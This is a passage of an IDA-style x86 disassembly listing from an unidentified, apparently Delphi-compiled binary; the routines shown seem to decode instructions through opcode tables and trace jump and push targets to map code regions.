; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408368	proc near		; CODE XREF: sub_40858C+75p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_18		= dword	ptr  20h
arg_34		= dword	ptr  3Ch
arg_3C		= dword	ptr  44h
arg_48		= dword	ptr  50h
arg_4C		= dword	ptr  54h
arg_50		= dword	ptr  58h
arg_54		= dword	ptr  5Ch
arg_58		= dword	ptr  60h
arg_5C		= dword	ptr  64h
arg_60		= dword	ptr  68h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF4h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], ecx
		mov	[ebp+var_C], edx
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_0]
		mov	edx, 24h
		call	sub_405424
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+var_8]
		mov	[eax+1Ch], edx
		cmp	[ebp+var_8], 0
		jz	loc_408525
		mov	eax, [ebp+arg_50]
		mov	word ptr [eax],	0
		xor	ecx, ecx
		push	ebp
		push	offset loc_408508
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		mov	eax, [ebp+var_C]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+var_4]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+arg_60]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+arg_5C]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+arg_58]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+arg_54]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+arg_10]
		mov	dword ptr [eax], 4

loc_4083DD:				; CODE XREF: sub_408368+8Dj
		mov	eax, [ebp+var_8]
		movzx	eax, byte ptr [eax]
		mov	edx, [ebp+arg_50]
		mov	[edx], ax
		inc	[ebp+var_8]
		push	ebp
		call	sub_4071EC
		pop	ecx
		test	al, al
		jnz	short loc_4083DD
		mov	eax, [ebp+arg_50]
		cmp	word ptr [eax],	0Fh
		jnz	short loc_40843E
		mov	eax, [ebp+var_8]
		movzx	eax, byte ptr [eax]
		mov	edx, [ebp+arg_50]
		mov	[edx], ax
		mov	eax, [ebp+arg_50]
		movzx	eax, word ptr [eax]
		movzx	eax, ds:word_4163C4[eax*2]
		mov	edx, [ebp+arg_4C]
		mov	[edx], eax
		mov	eax, [ebp+arg_50]
		movzx	eax, word ptr [eax]
		movzx	eax, ds:byte_416818[eax]
		mov	edx, [ebp+arg_48]
		mov	[edx], eax
		mov	eax, [ebp+arg_50]
		add	word ptr [eax],	0F00h
		inc	[ebp+var_8]
		jmp	short loc_408463
; ---------------------------------------------------------------------------

loc_40843E:				; CODE XREF: sub_408368+96j
		mov	eax, [ebp+arg_50]
		movzx	eax, word ptr [eax]
		movzx	eax, ds:word_4161C4[eax*2]
		mov	edx, [ebp+arg_4C]
		mov	[edx], eax
		mov	eax, [ebp+arg_50]
		movzx	eax, word ptr [eax]
		movzx	eax, ds:byte_416718[eax]
		mov	edx, [ebp+arg_48]
		mov	[edx], eax

loc_408463:				; CODE XREF: sub_408368+D4j
		mov	eax, [ebp+arg_4C]
		test	byte ptr [eax],	38h
		jz	short loc_4084C5
		push	ebp
		call	sub_407308
		pop	ecx
		mov	eax, [ebp+arg_4C]
		mov	eax, [eax]
		and	eax, 38h
		cmp	eax, 8
		jnz	short loc_4084C5
		mov	edx, 0Ah
		mov	eax, offset dword_4165C4

loc_408489:				; CODE XREF: sub_408368+15Bj
		xor	ecx, ecx
		mov	cl, [eax]
		mov	ebx, [ebp+arg_50]
		cmp	cx, [ebx]
		jnz	short loc_4084BF
		mov	ecx, [ebp+arg_3C]
		cmp	byte ptr [ecx],	0
		jz	short loc_4084AE
		mov	ecx, [ebp+arg_34]
		mov	ecx, [ecx]
		movzx	eax, word ptr [eax+ecx*2+2]
		mov	ecx, [ebp+arg_4C]
		mov	[ecx], eax
		jmp	short loc_4084C5
; ---------------------------------------------------------------------------

loc_4084AE:				; CODE XREF: sub_408368+133j
		mov	ecx, [ebp+arg_34]
		mov	ecx, [ecx]
		movzx	eax, word ptr [eax+ecx*2+12h]
		mov	ecx, [ebp+arg_4C]
		mov	[ecx], eax
		jmp	short loc_4084C5
; ---------------------------------------------------------------------------

loc_4084BF:				; CODE XREF: sub_408368+12Bj
		add	eax, 22h
		dec	edx
		jnz	short loc_408489

loc_4084C5:				; CODE XREF: sub_408368+101j
					; sub_408368+115j ...
		push	ebp
		call	sub_4075FC
		pop	ecx
		mov	edx, [ebp+arg_18]
		mov	[edx], eax
		push	ebp
		call	sub_4076E0
		pop	ecx
		test	al, al
		jz	short loc_4084F6
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax],	1
		push	ebp
		call	sub_407BF8
		pop	ecx
		cmp	[ebp+arg_C], 0
		jz	short loc_4084F6
		push	ebp
		call	sub_407E78
		pop	ecx

loc_4084F6:				; CODE XREF: sub_408368+172j
					; sub_408368+185j
		mov	eax, [ebp+arg_18]
		mov	eax, [eax]
		add	[ebp+var_8], eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_408518
; ---------------------------------------------------------------------------

loc_408508:				; DATA XREF: sub_408368+3Do
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax],	0
		call	sub_4033E8

loc_408518:				; CODE XREF: sub_408368+19Ej
		mov	eax, [ebp+arg_50]
		mov	ax, [eax]
		mov	edx, [ebp+arg_0]
		mov	[edx+2], ax

loc_408525:				; CODE XREF: sub_408368+2Cj
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+var_8]
		mov	[eax+20h], edx
		mov	eax, [ebp+arg_0]
		cmp	byte ptr [eax+6], 0
		jnz	short loc_408540
		mov	eax, [ebp+arg_0]
		cmp	byte ptr [eax+5], 0
		jz	short loc_408583

loc_408540:				; CODE XREF: sub_408368+1CDj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	edx, [ebp+arg_0]
		cmp	eax, [edx+20h]
		jnz	short loc_408583
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax+6], 0
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax+5], 0
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		mov	[eax+8], edx
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		mov	[eax+0Ch], edx
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		mov	[eax+10h], edx
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		mov	[eax+14h], edx
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax+18h], 0

loc_408583:				; CODE XREF: sub_408368+1D6j
					; sub_408368+1E4j
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	64h
sub_408368	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40858C	proc near		; CODE XREF: sub_408610+Fp
					; sub_408DD4+E0p ...

var_40		= byte ptr -40h
var_3C		= byte ptr -3Ch
var_38		= byte ptr -38h
var_34		= byte ptr -34h
var_30		= byte ptr -30h
var_2C		= byte ptr -2Ch
var_28		= byte ptr -28h
var_24		= byte ptr -24h
var_20		= byte ptr -20h
var_1C		= byte ptr -1Ch
var_18		= byte ptr -18h
var_13		= byte ptr -13h
var_12		= byte ptr -12h
var_11		= byte ptr -11h
var_10		= byte ptr -10h
var_C		= byte ptr -0Ch
var_8		= byte ptr -8
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= byte ptr -4
var_3		= byte ptr -3
var_2		= byte ptr -2
var_1		= byte ptr -1
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFC0h
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		mov	esi, edx
		mov	edi, eax
		lea	eax, [ebp+var_3]
		push	eax
		lea	eax, [ebp+var_4]
		push	eax
		lea	eax, [ebp+var_5]
		push	eax
		lea	eax, [ebp+var_6]
		push	eax
		lea	eax, [ebp+var_8]
		push	eax
		lea	eax, [ebp+var_C]
		push	eax
		lea	eax, [ebp+var_10]
		push	eax
		lea	eax, [ebp+var_11]
		push	eax
		lea	eax, [ebp+var_12]
		push	eax
		lea	eax, [ebp+var_13]
		push	eax
		lea	eax, [ebp+var_18]
		push	eax
		lea	eax, [ebp+var_1C]
		push	eax
		lea	eax, [ebp+var_20]
		push	eax
		lea	eax, [ebp+var_24]
		push	eax
		lea	eax, [ebp+var_28]
		push	eax
		lea	eax, [ebp+var_2C]
		push	eax
		lea	eax, [ebp+var_30]
		push	eax
		lea	eax, [ebp+var_34]
		push	eax
		lea	eax, [ebp+var_38]
		push	eax
		lea	eax, [ebp+var_3C]
		push	eax
		lea	eax, [ebp+var_40]
		push	eax
		push	esi
		push	ebx
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		lea	ecx, [ebp+var_2]
		lea	edx, [ebp+var_1]
		mov	eax, edi
		call	sub_408368
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	8
sub_40858C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_408610	proc near		; CODE XREF: sub_408888+8Ap
					; sub_408888+1B8p ...
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		push	0
		push	esi
		xor	ecx, ecx
		xor	edx, edx
		mov	eax, ebx
		call	sub_40858C
		pop	esi
		pop	ebx
		retn
sub_408610	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408628	proc near		; CODE XREF: sub_408888+5Cp
					; sub_408888+7Ep ...

var_10		= dword	ptr -10h
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		push	esi
		mov	[ebp+var_4], edx
		mov	esi, eax
		xor	eax, eax
		mov	[ebp+var_10], eax
		mov	[ebp+var_9], 1
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-24h]
		dec	eax
		test	eax, eax
		jl	loc_4086FD
		inc	eax
		mov	[ebp+var_8], 0

loc_408655:				; CODE XREF: sub_408628+CFj
		mov	edx, [ebp+var_8]
		add	edx, edx
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-28h]
		mov	ecx, [ecx+1Ch]
		lea	ecx, [ecx+edx*8]
		cmp	esi, [ecx]
		jnz	short loc_4086A6
		mov	edx, [ecx+0Ch]
		mov	eax, [ebp+var_4]
		cmp	edx, eax
		jnb	short loc_408681
		cmp	eax, [ecx]
		jnb	short loc_408681
		mov	eax, [ebp+var_4]
		mov	[ecx+0Ch], eax

loc_408681:				; CODE XREF: sub_408628+4Dj
					; sub_408628+51j
		xor	eax, eax
		mov	edx, [ebp+arg_0]
		add	edx, 0FFFFFFE0h

loc_408689:				; CODE XREF: sub_408628+76j
		mov	ebx, [ecx+eax*4+10h]
		cmp	ebx, [edx]
		jz	short loc_408697
		xor	ebx, ebx
		mov	[ecx+eax*4+10h], ebx

loc_408697:				; CODE XREF: sub_408628+67j
		inc	eax
		add	edx, 4
		cmp	eax, 8
		jnz	short loc_408689
		mov	[ebp+var_9], 0
		jmp	short loc_4086FD
; ---------------------------------------------------------------------------

loc_4086A6:				; CODE XREF: sub_408628+43j
		mov	ebx, [ecx]
		mov	edx, esi
		cmp	ebx, edx
		jnb	short loc_4086F3
		cmp	edx, [ecx+4]
		ja	short loc_4086F3
		mov	eax, [ecx+4]
		mov	[ebp+var_10], eax
		dec	edx
		mov	[ecx+4], edx
		xor	eax, eax
		mov	edx, [ebp+arg_0]
		add	edx, 0FFFFFFE0h

loc_4086C5:				; CODE XREF: sub_408628+B0j
		mov	ebx, [edx]
		cmp	ebx, [ecx+eax*4+10h]
		jz	short loc_4086D1
		xor	ebx, ebx
		mov	[edx], ebx

loc_4086D1:				; CODE XREF: sub_408628+A3j
		inc	eax
		add	edx, 4
		cmp	eax, 8
		jnz	short loc_4086C5
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-2Ch]
		cmp	eax, [ebp+var_8]
		jnz	short loc_4086FD
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-24h]
		mov	edx, [ebp+arg_0]
		mov	[edx-2Ch], eax
		jmp	short loc_4086FD
; ---------------------------------------------------------------------------

loc_4086F3:				; CODE XREF: sub_408628+84j
					; sub_408628+89j
		inc	[ebp+var_8]
		dec	eax
		jnz	loc_408655

loc_4086FD:				; CODE XREF: sub_408628+1Fj
					; sub_408628+7Cj ...
		cmp	[ebp+var_9], 0
		jz	loc_4087BD
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+1Ch]
		call	sub_40455C
		mov	edx, [ebp+arg_0]
		cmp	eax, [edx-24h]
		jnz	short loc_408776
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		cmp	dword ptr [eax+1Ch], 0
		jnz	short loc_408749
		push	8
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		add	eax, 1Ch
		mov	ecx, 1
		mov	edx, off_407104
		call	sub_404718
		add	esp, 4
		jmp	short loc_408776
; ---------------------------------------------------------------------------

loc_408749:				; CODE XREF: sub_408628+FFj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+1Ch]
		call	sub_40455C
		add	eax, eax
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		add	eax, 1Ch
		mov	ecx, 1
		mov	edx, off_407104
		call	sub_404718
		add	esp, 4

loc_408776:				; CODE XREF: sub_408628+F3j
					; sub_408628+11Fj
		mov	eax, [ebp+arg_0]
		inc	dword ptr [eax-24h]
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-24h]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		lea	eax, [edx+eax*8-30h]
		mov	[eax], esi
		mov	edx, [ebp+var_10]
		mov	[eax+4], edx
		mov	byte ptr [eax+8], 0
		mov	byte ptr [eax+9], 0
		mov	edx, [ebp+var_4]
		mov	[eax+0Ch], edx
		lea	edx, [eax+10h]
		mov	eax, [ebp+arg_0]
		add	eax, 0FFFFFFE0h
		mov	ecx, 20h
		call	sub_402664

loc_4087BD:				; CODE XREF: sub_408628+D9j
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_408628	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4087C4	proc near		; CODE XREF: sub_408888+111p
					; sub_408DD4+2EFp

arg_0		= byte ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		mov	esi, edx
		mov	edi, eax
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-28h]
		mov	eax, [eax+1Ch]
		call	sub_40455C
		mov	edx, [ebp+arg_4]
		cmp	eax, [edx-24h]
		jnz	short loc_40883F
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-28h]
		cmp	dword ptr [eax+1Ch], 0
		jnz	short loc_408812
		push	8
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-28h]
		add	eax, 1Ch
		mov	ecx, 1
		mov	edx, off_407104
		call	sub_404718
		add	esp, 4
		jmp	short loc_40883F
; ---------------------------------------------------------------------------

loc_408812:				; CODE XREF: sub_4087C4+2Cj
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-28h]
		mov	eax, [eax+1Ch]
		call	sub_40455C
		add	eax, eax
		push	eax
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-28h]
		add	eax, 1Ch
		mov	ecx, 1
		mov	edx, off_407104
		call	sub_404718
		add	esp, 4

loc_40883F:				; CODE XREF: sub_4087C4+20j
					; sub_4087C4+4Cj
		mov	eax, [ebp+arg_4]
		inc	dword ptr [eax-24h]
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-24h]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_4]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		lea	eax, [edx+eax*8-30h]
		mov	[eax], edi
		add	esi, edi
		dec	esi
		mov	[eax+4], esi
		mov	[eax+8], bl
		mov	dl, [ebp+arg_0]
		mov	[eax+9], dl
		xor	edx, edx
		mov	[eax+0Ch], edx
		add	eax, 10h
		mov	edx, 20h
		call	sub_405424
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	4
sub_4087C4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408888	proc near		; CODE XREF: sub_408DD4+31Dp
					; sub_4092B0+208p

var_58		= dword	ptr -58h
var_54		= byte ptr -54h
var_30		= byte ptr -30h
var_2E		= word ptr -2Eh
var_2A		= byte ptr -2Ah
var_28		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_2		= byte ptr -2
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFA8h
		push	ebx
		push	esi
		push	edi
		xor	edx, edx
		mov	[ebp+var_58], edx
		mov	[ebp+var_C], edx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_408DBE
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	byte ptr [ebx+5], 0
		jnz	short loc_4088B9
		cmp	byte ptr [ebx+6], 0
		jz	loc_408DA0

loc_4088B9:				; CODE XREF: sub_408888+25j
		cmp	dword ptr [ebx+0Ch], 0
		jnz	short loc_4088C9
		cmp	dword ptr [ebx+10h], 0
		jz	loc_408D3E

loc_4088C9:				; CODE XREF: sub_408888+35j
		mov	[ebp+var_1], 0
		call	sub_4071CC
		cmp	eax, [ebx+8]
		jnz	short loc_4088EF
		mov	[ebp+var_1], 1
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebx+20h]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		jmp	loc_408B11
; ---------------------------------------------------------------------------

loc_4088EF:				; CODE XREF: sub_408888+4Dj
		call	sub_4071E4
		cmp	eax, [ebx+8]
		jnz	short loc_408978
		mov	[ebp+var_1], 1
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebx+20h]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		lea	edx, [ebp+var_30]
		mov	eax, [ebx+20h]
		call	sub_408610
		cmp	[ebp+var_2A], 0
		jz	loc_408B11
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-30h]
		cmp	eax, [ebp+var_28]
		jnb	loc_408B11
		mov	eax, [ebx+1Ch]
		cmp	eax, [ebp+var_28]
		jbe	loc_408B11
		mov	eax, [ebp+var_28]
		sub	eax, 5
		cmp	byte ptr [eax],	68h
		jnz	loc_408B11
		mov	eax, [ebp+var_28]
		sub	eax, 4
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		cmp	eax, [edx-30h]
		jbe	loc_408B11
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+var_28]
		sub	eax, 4
		mov	eax, [eax]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		jmp	loc_408B11
; ---------------------------------------------------------------------------

loc_408978:				; CODE XREF: sub_408888+6Fj
		call	sub_4071D4
		cmp	eax, [ebx+8]
		jnz	short loc_4089D7
		mov	[ebp+var_1], 1
		mov	edx, [ebp+arg_0]
		push	edx
		push	1
		mov	eax, [ebx+20h]
		mov	edx, [eax]
		shl	edx, 3
		add	edx, 4
		xor	ecx, ecx
		call	sub_4087C4
		pop	ecx
		mov	eax, [ebx+20h]
		mov	edi, [eax]
		test	edi, edi
		jbe	loc_408B11
		mov	[ebp+var_8], 1

loc_4089B3:				; CODE XREF: sub_408888+148j
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebx+20h]
		mov	edx, [ebp+var_8]
		shl	edx, 3
		add	eax, edx
		mov	eax, [eax]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		inc	[ebp+var_8]
		dec	edi
		jnz	short loc_4089B3
		jmp	loc_408B11
; ---------------------------------------------------------------------------

loc_4089D7:				; CODE XREF: sub_408888+F8j
		call	sub_4071DC
		cmp	eax, [ebx+8]
		jnz	short loc_4089EA
		mov	[ebp+var_1], 1
		jmp	loc_408B11
; ---------------------------------------------------------------------------

loc_4089EA:				; CODE XREF: sub_408888+157j
		mov	eax, [ebx+8]
		cmp	eax, ds:dword_4161C0
		jnz	loc_408B11
		test	eax, eax
		jz	loc_408B11
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-2Ch]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		mov	eax, [edx+eax*8]
		cmp	eax, [ebx+1Ch]
		jnb	loc_408B11
		xor	eax, eax
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-2Ch]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		mov	eax, [edx+eax*8]
		lea	edx, [ebp+var_30]
		call	sub_408610
		jmp	short loc_408A70
; ---------------------------------------------------------------------------

loc_408A47:				; CODE XREF: sub_408888+1F4j
		cmp	[ebp+var_2E], 0B8h
		jnz	short loc_408A58
		mov	eax, [ebp+var_14]
		inc	eax
		mov	eax, [eax]
		mov	[ebp+var_8], eax

loc_408A58:				; CODE XREF: sub_408888+1C5j
		lea	edx, [ebp+var_54]
		mov	eax, [ebp+var_10]
		call	sub_408610
		lea	esi, [ebp+var_54]
		lea	edi, [ebp+var_30]
		mov	ecx, 9
		rep movsd

loc_408A70:				; CODE XREF: sub_408888+1BDj
		cmp	[ebp+var_30], 0
		jz	short loc_408A7E
		mov	eax, [ebx+1Ch]
		cmp	eax, [ebp+var_14]
		jnz	short loc_408A47

loc_408A7E:				; CODE XREF: sub_408888+1ECj
		cmp	[ebp+var_8], 0
		jz	loc_408B11
		add	[ebp+var_8], 0Ah
		mov	eax, [ebp+var_8]
		mov	ax, [eax]
		sub	ax, 1
		jb	short loc_408AA6
		jz	short loc_408ABC
		dec	ax
		jz	short loc_408AD2
		dec	ax
		jz	short loc_408AE8
		jmp	short loc_408B11
; ---------------------------------------------------------------------------

loc_408AA6:				; CODE XREF: sub_408888+20Ej
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+var_8]
		add	eax, 2
		mov	eax, [eax]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		jmp	short loc_408B11
; ---------------------------------------------------------------------------

loc_408ABC:				; CODE XREF: sub_408888+210j
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+var_8]
		add	eax, 6
		mov	eax, [eax]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		jmp	short loc_408B11
; ---------------------------------------------------------------------------

loc_408AD2:				; CODE XREF: sub_408888+215j
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+var_8]
		add	eax, 6
		mov	eax, [eax]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		jmp	short loc_408B11
; ---------------------------------------------------------------------------

loc_408AE8:				; CODE XREF: sub_408888+21Aj
		mov	eax, [ebp+var_8]
		add	eax, 2
		mov	eax, [eax]
		add	eax, 8
		mov	[ebp+var_8], eax
		jmp	short loc_408B08
; ---------------------------------------------------------------------------

loc_408AF8:				; CODE XREF: sub_408888+287j
		mov	edx, [ebp+arg_0]
		push	edx
		xor	edx, edx
		call	sub_408628
		pop	ecx
		add	[ebp+var_8], 14h

loc_408B08:				; CODE XREF: sub_408888+26Ej
		mov	eax, [ebp+var_8]
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_408AF8

loc_408B11:				; CODE XREF: sub_408888+62j
					; sub_408888+93j ...
		cmp	dword ptr [ebx+14h], 4
		jnz	loc_408C8B
		cmp	byte ptr [ebx+5], 0
		jnz	short loc_408B41
		mov	eax, [ebx+8]
		mov	edx, [ebp+arg_0]
		cmp	eax, [edx-34h]
		jb	short loc_408B41
		mov	eax, [ebx+8]
		mov	edx, [ebp+arg_0]
		cmp	eax, [edx-38h]
		ja	short loc_408B41
		cmp	[ebp+var_1], 0
		jz	loc_408C8B

loc_408B41:				; CODE XREF: sub_408888+297j
					; sub_408888+2A2j ...
		mov	esi, [ebx+8]
		test	esi, esi
		jz	short loc_408BBD
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-3Ch]
		push	eax
		lea	edx, [ebp+var_2]
		mov	eax, esi
		mov	ecx, 1
		call	sub_409CC0
		test	al, al
		jz	short loc_408BBD
		mov	al, [ebp+var_2]
		sub	al, 0E9h
		jz	short loc_408B77
		sub	al, 2
		jz	short loc_408B77
		sub	al, 14h
		jz	short loc_408B77
		add	al, 0FDh
		sub	al, 2
		jnb	short loc_408BBD

loc_408B77:				; CODE XREF: sub_408888+2DFj
					; sub_408888+2E3j ...
		lea	edx, [ebp+var_30]
		mov	eax, [ebx+8]
		call	sub_408610
		cmp	[ebp+var_30], 0
		jz	short loc_408BBD
		cmp	[ebp+var_28], 0
		jz	short loc_408BBD
		lea	ecx, [ebp+var_C]
		lea	edx, [ebp+var_8]
		mov	eax, [ebx+8]
		call	sub_4066FC
		test	al, al
		jz	short loc_408BB7
		lea	eax, [ebp+var_58]
		push	eax
		mov	edx, [ebx+8]
		xor	ecx, ecx
		mov	eax, [ebp+var_8]
		call	sub_406B9C
		cmp	[ebp+var_58], 0
		jnz	short loc_408BBD

loc_408BB7:				; CODE XREF: sub_408888+316j
		mov	eax, [ebp+var_28]
		mov	[ebx+8], eax

loc_408BBD:				; CODE XREF: sub_408888+2BEj
					; sub_408888+2D8j ...
		mov	[ebp+var_1], 1
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+20h]
		call	sub_404564
		mov	edi, eax
		test	edi, edi
		jl	short loc_408BFB
		inc	edi
		xor	esi, esi

loc_408BD8:				; CODE XREF: sub_408888+371j
		mov	eax, esi
		shl	eax, 3
		sub	eax, esi
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+20h]
		mov	eax, [edx+eax*4+8]
		cmp	eax, [ebx+20h]
		jnz	short loc_408BF7
		mov	[ebp+var_1], 0
		jmp	short loc_408BFB
; ---------------------------------------------------------------------------

loc_408BF7:				; CODE XREF: sub_408888+367j
		inc	esi
		dec	edi
		jnz	short loc_408BD8

loc_408BFB:				; CODE XREF: sub_408888+34Bj
					; sub_408888+36Dj
		cmp	[ebp+var_1], 0
		jz	loc_408C9B
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+20h]
		call	sub_40455C
		inc	eax
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		add	eax, 20h
		mov	ecx, 1
		mov	edx, off_407128
		call	sub_404718
		add	esp, 4
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+20h]
		call	sub_404564
		mov	edx, eax
		shl	eax, 3
		sub	eax, edx
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+20h]
		lea	eax, [edx+eax*4]
		mov	dl, [ebx+5]
		mov	[eax], dl
		mov	edx, [ebx+1Ch]
		mov	[eax+4], edx
		mov	edx, [ebx+20h]
		mov	[eax+8], edx
		mov	edx, [ebx+8]
		mov	[eax+0Ch], edx
		mov	dl, [ebx+7]
		mov	[eax+10h], dl
		mov	edx, [ebx+0Ch]
		mov	[eax+14h], edx
		mov	edx, [ebx+10h]
		mov	[eax+18h], edx
		test	edx, edx
		jz	short loc_408C9B
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		add	dword ptr [eax+30h], 4
		jmp	short loc_408C9B
; ---------------------------------------------------------------------------

loc_408C8B:				; CODE XREF: sub_408888+28Dj
					; sub_408888+2B3j
		mov	eax, [ebp+arg_0]
		push	eax
		mov	edx, [ebx+1Ch]
		mov	eax, [ebx+8]
		call	sub_408628
		pop	ecx

loc_408C9B:				; CODE XREF: sub_408888+377j
					; sub_408888+3F5j ...
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+24h]
		call	sub_404564
		mov	edi, eax
		test	edi, edi
		jl	loc_408DA0
		inc	edi
		xor	esi, esi

loc_408CB6:				; CODE XREF: sub_408888+4AEj
		lea	eax, [esi+esi*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+24h]
		mov	eax, [edx+eax*4+4]
		cmp	eax, [ebx+1Ch]
		jnz	short loc_408D34
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+24h]
		call	sub_404564
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+24h]
		lea	ecx, [esi+esi*2]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx-28h]
		mov	ebx, [ebx+24h]
		mov	edi, [edx+eax*4]
		mov	[ebx+ecx*4], edi
		mov	edi, [edx+eax*4+4]
		mov	[ebx+ecx*4+4], edi

